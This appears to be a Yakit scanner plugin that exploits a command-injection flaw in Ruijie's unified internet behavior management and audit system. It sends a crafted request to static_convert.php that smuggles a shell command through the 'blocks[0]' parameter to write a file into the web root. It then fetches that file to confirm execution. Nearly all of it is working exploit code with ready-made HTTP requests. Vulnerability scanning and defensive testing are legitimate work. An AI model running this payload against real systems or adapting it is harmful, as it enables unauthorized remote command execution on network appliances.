script_name: 锐捷统一上网行为管理与审计系统 static_convert.php 命令执行
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'111111111'%20>>%20/var/www/html/helpMe.txt%0A HTTP/1.1
Host: {{params(target)}}
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

`
	packet2 = `GET /helpMe.txt HTTP/1.1
Host: {{params(target)}}
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

`


    rsp,req,_ = poc.HTTP(packet1, 
    	poc.params({"target":addr}),
    	poc.https(isTls),
    	poc.redirectTimes(0),
    )

	rsp1,req1,_ = poc.HTTP(packet2, 
		poc.params({"target":addr}),
		poc.https(isTls),
		poc.redirectTimes(0),
	)



    if str.MatchAllOfSubString(rsp1, `HTTP/1.1 200`,`11111`){
        yakit.Info("%v found 锐捷统一上网行为管理与审计系统 static_convert.php 命令执行", addr)
        risk.NewRisk(
        addr,
        risk.title("锐捷统一上网行为管理与审计系统 static_convert.php 命令执行"),
        risk.severity("high"),
        risk.titleVerbose("锐捷统一上网行为管理与审计系统 static_convert.php 命令执行"),
        risk.request(string(req1)),
        risk.response(string(rsp1)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
